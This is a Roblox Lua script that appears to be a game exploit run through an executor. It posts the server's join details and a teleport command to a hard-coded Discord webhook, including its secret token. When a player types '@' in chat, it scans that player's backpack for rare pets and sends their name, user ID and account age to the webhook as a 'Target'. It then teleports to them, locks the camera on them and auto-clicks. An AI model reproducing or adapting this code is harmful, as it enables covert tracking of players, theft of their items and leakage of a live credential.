local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

-- Configure these:
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex","Dragonfly","Raccoon","Mimic Octopus","Butterfly","Disco bee","Queen bee"}

-- Verify webhook is working
local function verifyWebhook()
    local testPayload = {
        content = "🔹 Webhook Connection Test - Roqate 2025",
        embeds = {{
            description = "This is a verification message",
            color = 0x00FF00
        }}
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(testPayload))
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(response))
        return false
    end
    return true
end

-- Actually send data with confirmation
local function sendToDiscord(content, embedData)
    if not verifyWebhook() then return false end
    
    local payload = {
        content = content,
        embeds = {embedData}
    }
    
    local jsonData = HttpService:JSONEncode(payload)
    local success, response = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, jsonData)
    end)
    
    if not success then
        warn("Failed to send: "..tostring(response))
        return false
    end
    return true
end

-- Send initial server info
local function sendServerInfo()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    local success = sendToDiscord(
        "game:GetService('TeleportService'):TeleportToPlaceInstance("..placeId..", '"..jobId.."')",
        {
            title = "🚀 Server Join Info",
            description = "Execute this script to join",
            color = 0x3498db,
            fields = {
                {name = "Players", value = #Players:GetPlayers(), inline = true},
                {name = "Place ID", value = placeId, inline = true}
            }
        }
    )
    
    if success then
        print("✅ Server info sent to Discord")
    else
        warn("❌ Failed to send server info")
    end
end

-- Handle player @ mentions
local function handlePlayerMention(player)
    -- Get player items
    local items = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _,item in pairs(backpack:GetChildren()) do
            table.insert(items, item.Name)
        end
    end
    
    -- Check for rare pets
    local hasRare = false
    for _,pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            hasRare = true
            break
        end
    end
    
    -- Send to Discord
    local success = sendToDiscord(
        hasRare and "@everyone" or nil,
        {
            title = "🎯 Target: "..player.Name,
            description = #items > 0 and table.concat(items, "\n") or "No items found",
            color = hasRare and 0xFF0000 or 0x00FF00,
            fields = {
                {name = "User ID", value = player.UserId, inline = true},
                {name = "Account Age", value = player.AccountAge, inline = true}
            }
        }
    )
    
    if not success then return end
    
    -- Only proceed if webhook sent successfully
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local root = char:WaitForChild("HumanoidRootPart")
    
    local targetChar = player.Character or player.CharacterAdded:Wait()
    local targetTorso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
    local targetHead = targetChar:WaitForChild("Head")
    
    -- Teleport to target
    root.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
    
    -- Force first person view
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
    
    -- Force look at target
    local lookConn
    lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetHead.Position)
    end)
    
    -- Auto click after delay
    task.wait(0.5)
    mouse1click()
    
    -- Cleanup after 5 seconds
    task.wait(5)
    if lookConn then lookConn:Disconnect() end
end

-- Chat listener
local function onChatted(player, message)
    if player == LocalPlayer then return end
    if not string.find(message, "@") then return end
    
    coroutine.wrap(function()
        local success, err = pcall(handlePlayerMention, player)
        if not success then
            warn("Error handling mention: "..tostring(err))
        end
    end)()
end

-- Initialize
if verifyWebhook() then
    sendServerInfo()
    
    -- Setup chat listeners
    for _,player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                onChatted(player, msg)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            onChatted(player, msg)
        end)
    end)
else
    warn("Webhook verification failed - Check URL and try again")
end
